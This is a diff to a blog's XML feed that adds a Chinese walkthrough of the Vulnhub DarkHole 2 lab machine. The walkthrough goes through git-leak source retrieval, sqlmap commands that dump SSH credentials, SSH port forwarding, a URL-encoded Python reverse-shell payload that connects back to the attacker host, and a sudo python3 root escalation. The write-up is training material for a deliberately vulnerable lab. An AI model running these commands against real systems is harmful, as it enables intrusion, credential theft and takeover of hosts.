@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Vulnhub打靶-darkhole_2</title>
+      <link href="/post/c744004c.html"/>
+      <url>/post/c744004c.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/darkhole/darkhole_2.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>难度：困难</p><p>提示信息：Don’t waste your time For Brute-Force</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.154</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026141654340.png" alt="image-20241026141654340"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.154</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026142001602.png" alt="image-20241026142001602"></p><p>开放了<code>80</code>端口和<code>22</code>端口，我们还是老样子先对<code>80</code>端口进行信息收集</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026142255549.png" alt="image-20241026142255549"></p><p>我们在使用nmap的时候，帮我们探测出来了该网站存在<code>git</code>泄露，我们使用<code>githacker</code>获取网站源码，如下图所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githacker --url http://192.168.20.154/.git/ --output-folder darkhole</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026143205898.png" alt="image-20241026143205898"></p><p>我们成功获取部分源码，当我们在查看<code>login.php</code>的时候，发现了很明显的sql注入的漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5d9fdcaed63e388e8f25dab9fbce9269.png" alt="5d9fdcaed63e388e8f25dab9fbce9269"></p><p>这摆明了就是要靠sql注入的节奏</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026144549097.png" alt="image-20241026144549097"></p><p>但是这里直接给我禁止了，说明还是不可以进行sql注入的，因为会限制输入的符号，我们用sqlmap跑的结果也是，显示可能存在waf，所以我们还是得从别的地方找切入口</p><p>我们尝试从提交日志去寻找关键信息，我们一条一条日志去分析，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026145842200.png" alt="image-20241026145842200"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026150018464.png" alt="image-20241026150018464"></p><p>成功发现登录的账号密码，我们直接登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lush@admin.com/321</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026183834429.png" alt="image-20241026183834429"></p><p>我们发现后面的<code>id=1</code>可能存在sql注入，我们先尝试手注测试一下，当我们输入<code>id=1&#39;</code>时页面不正常，但是当我们输入<code>id=1&#39; --+</code>的时候，页面显示正常，说明存在sql注入，我们尝试用sqlmap去跑，看是否能跑出来</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026184714394.png" alt="image-20241026184714394"></p><p>我们这里跑出来他的数据库是mysql，说明存在sql注入，接下来我们一步步脱裤数据即可</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>首先执行<code>python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; --dbs --batch</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026184830497.png" alt="image-20241026184830497"></p><p>我们可以发现存在以上几个数据库，我们先查询<code>darkhole_2</code>的表，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185040180.png" alt="image-20241026185040180"></p><p>我们直接查<code>ssh</code>表中的列数据，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 -T ssh --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185215576.png" alt="image-20241026185215576"></p><p>接下来就直接查看密码即可，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 -T ssh --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185458130.png" alt="image-20241026185458130"></p><p>成功获取一个ssh用户的账号密码，我们直接ssh登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jehad/fool</span><br></pre></td></tr></table></figure><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185643791.png" alt="image-20241026185643791"></p><p>成功登录上去，我们寻找第一个flag，我们在losy用户下发现了<code>user.txt</code>，读取，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DarkHole&#123;&#x27;This_is_the_life_man_better_than_a_cruise&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026190139540.png" alt="image-20241026190139540"></p><p>接下来我们要进行的就是进行提权了，我们要提升到root权限才能方便我们继续我们下一步的操作</p><h2 id="权限横向移动"><a href="#权限横向移动" class="headerlink" title="权限横向移动"></a>权限横向移动</h2><p>我们检查了<code>jeahd</code>用户下的sudo提权和suid提权，都不存在可以利用的点，而<code>user.txt</code>是在<code>losy</code>用户下发现的，所以我们需要切换到<code>losy</code>用户下，我们接着寻找有没有可以利用的点</p><p>在我们上传的提权脚本中，我们发现靶机还开放了一个<code>9999</code>端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026192605583.png" alt="image-20241026192605583"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c64490d09eec643cd56ffbc95c39ff51.png" alt="c64490d09eec643cd56ffbc95c39ff51"></p><p>我们尝试用web去访问这个9999端口，但是访问不到</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026193150781.png" alt="image-20241026193150781"></p><p>我们尝试去访问这个web服务的源码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026193942830.png" alt="image-20241026193942830"></p><p>是一个cmd执行任意命令的脚本，我们现在只要能够访问到这个web服务，我们就可以将losy的权限反弹shell到我们本地来，我们首先进行本地端口转发，不然一直访问不到web页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026194550831.png" alt="image-20241026194550831"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 9999:localhost:9999 jehad@192.168.20.154</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026194707380.png" alt="image-20241026194707380"></p><p>接下来我们就可以访问到web服务了，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026195106815.png" alt="image-20241026195106815"></p><p>接下来我们直接反弹shell即可，记得将反弹shell语句进行url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &quot;http://127.0.0.1:9999/?cmd=export+RHOST%3d%22192.168.20.138%22%3bexport+RPORT%3d9001%3bpython3+-c+%27import+sys%2csocket%2cos%2cpty%3bs%3dsocket.socket()%3bs.connect((os.getenv(%22RHOST%22)%2cint(os.getenv(%22RPORT%22))))%3b%5bos.dup2(s.fileno()%2cfd)+for+fd+in+(0%2c1%2c2)%5d%3bpty.spawn(%22%2fbin%2fbash%22)%27&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026195718604.png" alt="image-20241026195718604"></p><p>成功获得losy权限</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们尝试<code>sudo -l</code>的时候，发现需要用户密码，但是我们没有用户密码，我们输入<code>history</code>命令后，发现泄露了用户密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200234653.png" alt="image-20241026200234653"></p><p>我们继续使用<code>sudo -l</code>提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200313115.png" alt="image-20241026200313115"></p><p>我们发现python3可以用来进行sudo提权，我们执行以下语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200549909.png" alt="image-20241026200549909"></p><p>成功获取root权限，我们直接寻找最后一个flag即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DarkHole&#123;&#x27;Legend&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200649045.png" alt="image-20241026200649045"></p><p>本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题难度比较大，考的点也比较多，在vulnhub上也别认定为为hard难度，首先就是git泄露，但是git泄露不要被他的源码给骗了，最重要的还是去查看git日志，里面隐藏了关键信息，然后进入网站后也要有发现sql注入的敏感性，通过sql注入脱裤找到ssh登录的账号密码，然后权限横向移动，通过端口转发实现反弹shell，这也是我第一次遇见端口转发的题目，最后再进行sudo提权，总体来讲思路很清晰，但是有些信息不是那么好找，还是得细心吧，就像我一样错过了<code>9999</code>的异常端口，导致耗了很久。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> 红蓝对抗 </category>
+          
+          <category> 红队入侵 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 实战打靶 </tag>
+            
+            <tag> 红队技战法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnhub打靶-DC:2</title>
       <link href="/post/ca55a63c.html"/>
       <url>/post/ca55a63c.html</url>
@@ -1861,11 +1892,11 @@
       
         <tags>
             
+            <tag> 端口扫描 </tag>
+            
             <tag> CDN </tag>
             
             <tag> WAF </tag>
-            
-            <tag> 端口扫描 </tag>
             
             <tag> 负载均衡 </tag>
             
@@ -1993,15 +2024,15 @@
       
         <tags>
             
+            <tag> CDN </tag>
+            
+            <tag> WAF </tag>
+            
             <tag> Web安全 </tag>
             
             <tag> 资产架构 </tag>
             
             <tag> 端口 </tag>
-            
-            <tag> CDN </tag>
-            
-            <tag> WAF </tag>
             
             <tag> 源码泄露 </tag>
             
